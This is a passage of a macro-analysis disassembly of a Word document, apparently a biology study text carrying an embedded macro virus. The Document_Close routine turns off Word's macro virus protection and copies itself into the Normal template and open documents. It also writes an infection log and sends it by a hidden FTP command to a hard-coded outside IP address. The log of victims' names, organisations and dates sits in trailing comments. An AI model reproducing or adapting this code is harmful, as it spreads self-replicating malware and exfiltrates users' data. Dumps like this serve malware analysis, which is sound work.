+' 	Reparse 0x00F2 "As the population's exposure to the environment changes, some individuals will be better able to survive there than others of the same species. The reason for the difference in the ability to survive is in the genes of the individuals. But it"
+' Line #887:
+' 	Reparse 0x00BE "is not until some factor in the environment reveals the survival advantage some individuals possess, that such a genetic difference becomes important. This is the basis of Natural Selection."
+' Line #888:
+' Line #889:
+' Line #890:
+' Line #891:
+' 	ArgsCall Clines 0x0000 
+' Line #892:
+' Line #893:
+' 	Reparse 0x00CC "Gradually varying phenotypes and genotypes of a species over a range of geographic locations are called clines. A species that varies with geographic location in this way is said to show clinal variation."
+' Line #894:
+' Line #895:
+' 	Reparse 0x01A4 "One of the most obvious examples of clinal variation is in the population of the species Homo sapiens. If we consider the many groups of humans in the world that we call 'races' this idea of clinal variation is well illustrated. Although we all belong to the same species, different environmental pressures have, over time, selected for different phenotypes (and different genotypes) in different geographical locations."
+' Line #896:
+' Line #897:
+' 	Reparse 0x00E7 "With the ease of world travel these days, many H.sapiens are moving away from their traditional geographic locations. Gene flow is occurring between the groups and some interesting, and often very beautiful, offspring are produced."
+' Line #898:
+' Line #899:
+' Line #900:
+' Line #901:
+' 	ArgsCall mutagens 0x0000 
+' Line #902:
+' Line #903:
+' 	Reparse 0x0099 "A number of physical and chemical agents in the environment, known collectively as mutagens, can interact with DNA to increase the frequency of mutation."
+' Line #904:
+' Line #905:
+' 	Reparse 0x022E "Some mutations have been shown to be temperature sensitive, that is, the altered protein functions normally at a certain range of temperatures, but not outside this range. If this type of mutation extends the range of tolerance of an organism, it could be of great benefit. In practice, such mutations generally reduce the tolerance limits of the protein and so are disadvantageous. With the current trend towards global warming due to the greenhouse effect, such temperature sensitive mutations may become important in the survival (or not) of some species."
+' Line #906:
+' Line #907:
+' 	Reparse 0x011B "Radiation, such as in X-rays and ultraviolet rays, may be increased in the environment due to human activity, but a constant natural source of such radiation is the sun, and this is undoubtedly the reason for some of the spontaneous mutations which occur with measurable frequencies."
+' Line #908:
+' Line #909:
+' 	Reparse 0x00E9 "Mutagenic chemicals can be the product of bacterial metabolism, viral activity inside cells, digestive processes or non-specific defence to foreign organisms. In recent times, human activity has added many new chemicals to this list."
+' Line #910:
+' Line #911:
+' 	Reparse 0x0011 "As stated before,"
+' Line #912:
+' Line #913:
+' 	Reparse 0x0025 "mutagens and the mutations they cause"
+' Line #914:
+' 	Reparse 0x002A "can produce somatic changes in eukaryotes,"
+' Line #915:
+' 	Reparse 0x0002 "or"
+' Line #916:
+' 	Reparse 0x0023 "they can effect developing gametes."
+' Line #917:
+' Line #918:
+' 	Reparse 0x004B "                           The outcomes for evolution are vastly different!"
+' Line #919:
+' Line #920:
+' Line #921:
+' Line #922:
+' Line #923:
+' Line #924:
+' Line #925:
+' Line #926:
+' Line #927:
+' Line #928:
+' Line #929:
+' Line #930:
+' Line #931:
+' 	FuncDefn (Private Sub Label1_Click())
+' Line #932:
+' Line #933:
+' 	QuoteRem 0x0000 0x0031 "Open Access Loves Nicky F. Also! 8/06/99 20:39:59"
+' Line #934:
+' 	QuoteRem 0x0000 0x002B "V.U.T Loves Nicky F. Also! 9/06/99 18:53:21"
+' Line #935:
+' 	QuoteRem 0x0000 0x002C "Hien Loves Nicky F. Also! 6/10/99 7:57:15 AM"
+' Line #936:
+' 	QuoteRem 0x0000 0x0033 "Huy Nguyen Loves Nicky F. Also! 6/28/99 11:02:24 AM"
+' Line #937:
+' 	EndSub 
+' Line #938:
+' 	FuncDefn (Private Sub Document_Close())
+' Line #939:
+' Line #940:
+' 	OnError (Resume Next) 
+' Line #941:
+' Line #942:
+' 	Dim (Const) 
+' 	LitStr 0x0014 "<- this is a marker!"
+' 	VarDefn Marker
+' Line #943:
+' Line #944:
+' 	QuoteRem 0x0000 0x0011 "Declare Variables"
+' Line #945:
+' 	Dim 
+' 	VarDefn SaveDocument
+' 	VarDefn SaveNormalTemplate
+' 	VarDefn DocumentInfected
+' 	VarDefn NormalTemplateInfected (As Boolean)
+' Line #946:
+' 	Dim 
+' 	VarDefn ad
+' 	VarDefn nt (As Object)
+' Line #947:
+' 	Dim 
+' 	VarDefn OurCode
+' 	VarDefn UserAddress
+' 	VarDefn LogData
+' 	VarDefn LogFile (As String)
+' Line #948:
+' Line #949:
+' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
+' Line #950:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set ad 
+' Line #951:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set nt 
+' Line #952:
+' Line #953:
+' 	Ld Marker 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x2710 
+' 	LitDI2 0x2710 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Find 0x0005 
+' 	St DocumentInfected 
+' Line #954:
+' 	Ld Marker 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x2710 
+' 	LitDI2 0x2710 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Find 0x0005 
+' 	St NormalTemplateInfected 
+' Line #955:
+' Line #956:
+' Line #957:
+' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
+' Line #958:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #959:
+' Line #960:
+' Line #961:
+' 	ArgsLd Now 0x0000 
+' 	ArgsLd Day 0x0001 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	Paren 
+' 	LitStr 0x0000 ""
+' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
+' 	LitStr 0x0007 "LogFile"
+' 	Ld System 
+' 	ArgsMemLd PrivateProfileString 0x0003 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	Paren 
+' 	And 
+' 	IfBlock 
+' Line #962:
+' Line #963:
+' 	Ld DocumentInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #964:
+' 	LitDI2 0x0001 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St LogData 
+' Line #965:
+' 	Ld NormalTemplateInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	ElseIfBlock 
+' Line #966:
+' 	LitDI2 0x0001 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St LogData 
+' Line #967:
+' 	EndIfBlock 
+' Line #968:
+' Line #969:
+' 	Ld LogData 
+' 	LitDI2 0x0001 
+' 	Ld LogData 
+' 	LitStr 0x0005 "' Log"
+' 	LitStr 0x0008 "file -->"
+' 	Concat 
+' 	FnInStr3 
+' 	Ld LogData 
+' 	FnLen 
+' 	LitDI2 0x0001 
+' 	Ld LogData 
+' 	LitStr 0x0005 "' Log"
+' 	LitStr 0x0008 "file -->"
+' 	Concat 
+' 	FnInStr3 
+' 	Sub 
+' 	ArgsLd Mid$ 0x0003 
+' 	St LogData 
+' Line #970:
+' Line #971:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0004 
+' 	For 
+' Line #972:
+' 	Ld LogFile 
+' 	LitDI2 0x0008 
+' 	Ld Rnd 
+' 	Mul 
+' 	FnInt 
+' 	ArgsLd Str 0x0001 
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	Add 
+' 	St LogFile 
+' Line #973:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #974:
+' 	LitStr 0x0006 "C:\hsf"
+' 	Ld LogFile 
+' 	Concat 
+' 	LitStr 0x0004 ".sys"
+' 	Concat 
+' 	St LogFile 
+' Line #975:
+' Line #976:
+' 	Ld LogFile 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Output)
+' Line #977:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	Ld LogData 
+' 	PrintItemNL 
+' Line #978:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #979:
+' Line #980:
+' 	LitStr 0x000D "c:\netldx.vxd"
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Output)
+' Line #981:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0010 "o 209.201.88.110"
+' 	PrintItemNL 
+' Line #982:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x000E "user anonymous"
+' 	PrintItemNL 
+' Line #983:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x000B "pass itsme@"
+' 	PrintItemNL 
+' Line #984:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x000B "cd incoming"
+' 	PrintItemNL 
+' Line #985:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0005 "ascii"
+' 	PrintItemNL 
+' Line #986:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0004 "put "
+' 	Ld LogFile 
+' 	Concat 
+' 	PrintItemNL 
+' Line #987:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0004 "quit"
+' 	PrintItemNL 
+' Line #988:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #989:
+' Line #990:
+' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #991:
+' Line #992:
+' 	LitVarSpecial (True)
+' 	LitStr 0x0000 ""
+' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
+' 	LitStr 0x0007 "LogFile"
+' 	Ld System 
+' 	ArgsMemSt PrivateProfileString 0x0003 
+' Line #993:
+' Line #994:
+' 	EndIfBlock 
+' Line #995:
+' Line #996:
+' Line #997:
+' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
+' Line #998:
+' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
+' 	Ld DocumentInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Ld NormalTemplateInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Xor 
+' 	Paren 
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatDocument 
+' 	Eq 
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatTemplate 
+' 	Eq 
+' 	Or 
+' 	Paren 
+' 	And 
+' 	IfBlock 
+' Line #999:
+' Line #1000:
+' Line #1001:
+' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
+' Line #1002:
+' 	Ld DocumentInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #1003:
+' Line #1004:
+' 	Ld NormalTemplate 
+' 	MemLd Saved 
+' 	St SaveNormalTemplate 
+' Line #1005:
+' Line #1006:
+' 	LitDI2 0x0001 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St OurCode 
+' Line #1007:
+' Line #1008:
+' Line #1009:
+' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
+' Line #1010:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	FnLen 
+' 	For 
+' Line #1011:
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	Ld i 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Ne 
+' 	IfBlock 
+' Line #1012:
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	Ld i 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitDI2 0x000A 
+' 	ArgsLd Chr 0x0001 
+' 	Ne 
+' 	IfBlock 
+' Line #1013:
+' 	Ld UserAddress 
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	Ld i 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	Concat 
+' 	St UserAddress 
+' Line #1014:
+' 	EndIfBlock 
+' Line #1015:
+' 	ElseBlock 
+' Line #1016:
+' 	Ld UserAddress 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	St UserAddress 
+' Line #1017:
+' 	EndIfBlock 
+' Line #1018:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	NextVar 
+' Line #1019:
+' Line #1020:
+' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
+' 	Ld OurCode 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	Ld Time 
+' 	LitStr 0x0010 "hh:mm:ss AMPM - "
+' 	ArgsLd Format$ 0x0002 
+' 	Concat 
+' 	Ld Date 
+' 	LitStr 0x0010 "dddd, d mmm yyyy"
+' 	ArgsLd Format$ 0x0002 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	Ld UserAddress 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St OurCode 
+' Line #1021:
+' Line #1022:
+' Line #1023:
+' 	LitDI2 0x0001 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #1024:
+' 	Ld OurCode 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #1025:
+' Line #1026:
+' 	Ld SaveNormalTemplate 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' 	EndIf 
+' Line #1027:
+' Line #1028:
+' 	EndIfBlock 
+' Line #1029:
+' Line #1030:
+' Line #1031:
+' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
+' Line #1032:
+' 	LineCont 0x0008 05 00 05 00 13 00 05 00
+' 	Ld NormalTemplateInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 ":"
+' 	Eq 
+' 	Ld ActiveDocument 
+' 	MemLd Saved 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	Or 
+' 	Paren 
+' 	And 
+' 	IfBlock 
+' Line #1033:
+' Line #1034:
+' 	Ld ActiveDocument 
+' 	MemLd Saved 
+' 	St SaveDocument 
+' Line #1035:
+' Line #1036:
+' 	LitDI2 0x0001 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St OurCode 
+' Line #1037:
+' Line #1038:
+' 	LitDI2 0x0001 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #1039:
+' 	Ld OurCode 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #1040:
+' Line #1041:
+' 	Ld SaveDocument 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' 	EndIf 
+' Line #1042:
+' Line #1043:
+' 	EndIfBlock 
+' Line #1044:
+' Line #1045:
+' Line #1046:
+' 	EndIfBlock 
+' Line #1047:
+' Line #1048:
+' 	EndSub 
+' Line #1049:
+' Line #1050:
+' 	QuoteRem 0x0000 0x000C " Logfile -->"
+' Line #1051:
+' Line #1052:
+' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
+' Line #1053:
+' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
+' Line #1054:
+' 	QuoteRem 0x0000 0x000C " Blue Planet"
+' Line #1055:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1056:
+' Line #1057:
+' Line #1058:
+' Line #1059:
+' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
+' Line #1060:
+' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
+' Line #1061:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1062:
+' Line #1063:
+' Line #1064:
+' Line #1065:
+' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
+' Line #1066:
+' 	QuoteRem 0x0000 0x0004 " UPS"
+' Line #1067:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1068:
+' Line #1069:
+' Line #1070:
+' Line #1071:
+' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
+' Line #1072:
+' 	QuoteRem 0x0000 0x0004 " WRO"
+' Line #1073:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1074:
+' Line #1075:
+' Line #1076:
+' Line #1077:
+' 	QuoteRem 0x0000 0x0023 " 11:37:56 AM - Tuesday, 29 Dec 1998"
+' Line #1078:
+' 	QuoteRem 0x0000 0x0009 " Dan Ross"
+' Line #1079:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1080:
+' Line #1081:
+' Line #1082:
+' Line #1083:
+' 	QuoteRem 0x0000 0x0022 " 09:50:06 AM - Monday, 11 Jan 1999"
+' Line #1084:
+' 	QuoteRem 0x0000 0x000F " Karen M. Pinks"
+' Line #1085:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1086:
+' Line #1087:
+' Line #1088:
+' Line #1089:
+' 	QuoteRem 0x0000 0x0024 " 04:41:03 PM - Thursday, 21 Jan 1999"
+' Line #1090:
+' 	QuoteRem 0x0000 0x0013 " george w. connelly"
+' Line #1091:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1092:
+' Line #1093:
+' Line #1094:
+' Line #1095:
+' 	QuoteRem 0x0000 0x0023 " 06:35:17 PM - Tuesday, 26 Jan 1999"
+' Line #1096:
+' 	QuoteRem 0x0000 0x000F " lynn ann casey"
+' Line #1097:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1098:
+' Line #1099:
+' Line #1100:
+' Line #1101:
+' 	QuoteRem 0x0000 0x0023 " 10:10:39  - Wednesday, 27 Jan 1999"
+' Line #1102:
+' 	QuoteRem 0x0000 0x000B " Jo Baldock"
+' Line #1103:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1104:
+' Line #1105:
+' Line #1106:
+' Line #1107:
+' 	QuoteRem 0x0000 0x0021 " 10:49:33 AM - Monday, 1 Feb 1999"
+' Line #1108:
+' 	QuoteRem 0x0000 0x0012 " Richard P. Panico"
+' Line #1109:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1110:
+' Line #1111:
+' Line #1112:
+' Line #1113:
+' 	QuoteRem 0x0000 0x0024 " 05:11:22 PM - Wednesday, 3 Feb 1999"
+' Line #1114:
+' 	QuoteRem 0x0000 0x0015 " Jennifer A. Johnsonj"
+' Line #1115:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1116:
+' Line #1117:
+' Line #1118:
+' Line #1119:
+' 	QuoteRem 0x0000 0x0020 " 02:03:10  - Tuesday, 9 Feb 1999"
+' Line #1120:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #1121:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1122:
+' Line #1123:
+' Line #1124:
+' Line #1125:
+' 	QuoteRem 0x0000 0x0023 " 05:05:46  - Wednesday, 10 Feb 1999"
+' Line #1126:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #1127:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1128:
+' Line #1129:
+' Line #1130:
+' Line #1131:
+' 	QuoteRem 0x0000 0x0022 " 02:04:06 PM - Monday, 22 Feb 1999"
+' Line #1132:
+' 	QuoteRem 0x0000 0x000F " Sally Papworth"
+' Line #1133:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1134:
+' Line #1135:
+' Line #1136:
+' Line #1137:
+' 	QuoteRem 0x0000 0x0022 " 12:39:10 PM - Tuesday, 2 Mar 1999"
+' Line #1138:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #1139:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1140:
+' Line #1141:
+' Line #1142:
+' Line #1143:
+' 	QuoteRem 0x0000 0x0022 " 06:58:41  - Wednesday, 3 Mar 1999"
+' Line #1144:
+' 	QuoteRem 0x0000 0x000C " Sonja Mills"
+' Line #1145:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1146:
+' Line #1147:
+' Line #1148:
+' Line #1149:
+' 	QuoteRem 0x0000 0x0023 " 12:02:55 PM - Tuesday, 16 Mar 1999"
+' Line #1150:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #1151:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1152:
+' Line #1153:
+' Line #1154:
+' Line #1155:
+' 	QuoteRem 0x0000 0x0025 " 04:44:14 PM - Wednesday, 24 Mar 1999"
+' Line #1156:
+' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
+' Line #1157:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1158:
+' Line #1159:
+' Line #1160:
+' Line #1161:
+' 	QuoteRem 0x0000 0x0022 " 11:47:20 AM - Friday, 26 Mar 1999"
+' Line #1162:
+' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
+' Line #1163:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1164:
+' Line #1165:
+' Line #1166:
+' Line #1167:
+' 	QuoteRem 0x0000 0x0023 " 07:42:40 PM - Tuesday, 20 Apr 1999"
+' Line #1168:
+' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
+' Line #1169:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1170:
+' Line #1171:
+' Line #1172:
+' Line #1173:
+' 	QuoteRem 0x0000 0x0020 " 12:19:56  - Friday, 23 Apr 1999"
+' Line #1174:
+' 	QuoteRem 0x0000 0x0004 " Phi"
+' Line #1175:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1176:
+' Line #1177:
+' Line #1178:
+' Line #1179:
+' 	QuoteRem 0x0000 0x0024 " 10:13:02 PM - Wednesday, 5 May 1999"
+' Line #1180:
+' 	QuoteRem 0x0000 0x0004 " ***"
+' Line #1181:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1182:
+' Line #1183:
+' Line #1184:
+' Line #1185:
+' 	QuoteRem 0x0000 0x0024 " 06:10:32 AM - Saturday, 29 May 1999"
+' Line #1186:
+' 	QuoteRem 0x0000 0x000B " Huy Nguyen"
+' Line #1187:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1188:
+' Line #1189:
+' Line #1190:
+' Line #1191:
+' 	QuoteRem 0x0000 0x0022 " 07:45:25 PM - Monday, 31 May 1999"
+' Line #1192:
+' 	QuoteRem 0x0000 0x000B " Huy Nguyen"
+' Line #1193:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1194:
+' Line #1195:
+' Line #1196:
+' Line #1197:
+' 	QuoteRem 0x0000 0x0023 " 03:18:50 pm - Thursday, 1 Jul 1999"
+' Line #1198:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #1199:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1200:
+' Line #1201:
+' Line #1202:
+' 	QuoteRem 0x0000 0x002D "VUT Loves Nicky F. Also! 23/07/99 12:43:05 pm"
+' Line #1203:
+' Line #1204:
+' Line #1205:
+' 	QuoteRem 0x0000 0x002C "VUT Loves Nicky F. Also! 29/07/99 3:48:39 pm"
+' Line #1206:
+' Line #1207:
+' Line #1208:
+' 	QuoteRem 0x0000 0x002C "VUT Loves Nicky F. Also! 5/08/99 11:14:05 am"
+' Line #1209:
+' Line #1210:
+' Line #1211:
+' 	QuoteRem 0x0000 0x002C "VUT Loves Nicky F. Also! 5/08/99 11:57:56 am"
+' Line #1212:
+' Line #1213:
+' Line #1214:
+' 	QuoteRem 0x0000 0x0041 "Building M Open Access Lab Loves Nicky F. Also! 11/08/99 12:50:02"
+' Line #1215:
+' 	QuoteRem 0x0000 0x003C "Bulbing M Open Access Loves Nicky F. Also! 11/08/99 14:06:53"
+' Line #1216:
+' Line #1217:
+' Line #1218:
+' 	QuoteRem 0x0000 0x0041 "Building M Open Access Lab Loves Nicky F. Also! 18/08/99 11:21:01"
+' Line #1219:
+' Line #1220:
+' Line #1221:
+' 	QuoteRem 0x0000 0x0040 "Building M Open Access Lab Loves Nicky F. Also! 1/09/99 11:49:55"
+' Line #1222:
+' 	QuoteRem 0x0000 0x0040 "Building M Open Access Lab Loves Nicky F. Also! 1/09/99 13:04:13"
+' Line #1223:
+' Line #1224:
+' Line #1225:
+' Line #1226:
+' 	QuoteRem 0x0000 0x0021 " 04:49:27  - Thursday, 9 Sep 1999"
+' Line #1227:
+' 	QuoteRem 0x0000 0x001B " Building M Open Access Lab"
+' Line #1228:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1229:
+' Line #1230:
+' Line #1231:
+' Line #1232:
+' 	QuoteRem 0x0000 0x0021 " 03:25:58  - Tuesday, 14 Sep 1999"
+' Line #1233:
+' 	QuoteRem 0x0000 0x001B " Building M Open Access Lab"
+' Line #1234:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1235:
+' Line #1236:
+' Line #1237:
+' Line #1238:
+' 	QuoteRem 0x0000 0x0022 " 03:44:46  - Thursday, 16 Sep 1999"
+' Line #1239:
+' 	QuoteRem 0x0000 0x001B " Building M Open Access Lab"
+' Line #1240:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1241:
+' Line #1242:
+' Line #1243:
+' Line #1244:
+' 	QuoteRem 0x0000 0x0022 " 05:53:35  - Wednesday, 6 Oct 1999"
+' Line #1245:
+' 	QuoteRem 0x0000 0x001B " Building M Open Access Lab"
+' Line #1246:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1247:
+' Line #1248:
+' Line #1249:
+' Line #1250:
+' 	QuoteRem 0x0000 0x0025 " 04:57:02 PM - Wednesday, 27 Oct 1999"
+' Line #1251:
+' 	QuoteRem 0x0000 0x0004 " lib"
+' Line #1252:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1253:
+' Line #1254:
+' Line #1255:
+' Line #1256:
+' 	QuoteRem 0x0000 0x0022 " 09:22:12  - Wednesday, 3 Nov 1999"
+' Line #1257:
+' 	QuoteRem 0x0000 0x0007 " A.C.U."
+' Line #1258:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1259:
+' Line #1260:
+' Line #1261:
+' Line #1262:
+' 	QuoteRem 0x0000 0x0020 " 10:37:49  - Monday, 15 Nov 1999"
+' Line #1263:
+' 	QuoteRem 0x0000 0x0007 " A.C.U."
+' Line #1264:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1265:
+' Line #1266:
+' Line #1267:
+' Line #1268:
+' 	QuoteRem 0x0000 0x0020 " 04:51:32  - Monday, 15 Nov 1999"
+' Line #1269:
+' 	QuoteRem 0x0000 0x0012 " St Kevins College"
+' Line #1270:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1271:
+' Line #1272:
+' Line #1273:
+' Line #1274:
+' 	QuoteRem 0x0000 0x0020 " 12:06:40  - Friday, 28 Jan 2000"
+' Line #1275:
+' 	QuoteRem 0x0000 0x000F " Administration"
+' Line #1276:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1277:
+' Line #1278:
+' Line #1279:
+' Line #1280:
+' 	QuoteRem 0x0000 0x0022 " 08:15:40  - Thursday, 17 Feb 2000"
+' Line #1281:
+' 	QuoteRem 0x0000 0x0012 " St Kevins College"
+' Line #1282:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #1283:
+' Line #1284:
+' Line #1285:
+' Line #1286:
+' 	QuoteRem 0x0000 0x0022 " 05:50:06  - Saturday, 19 Feb 2000"
+' Line #1287:
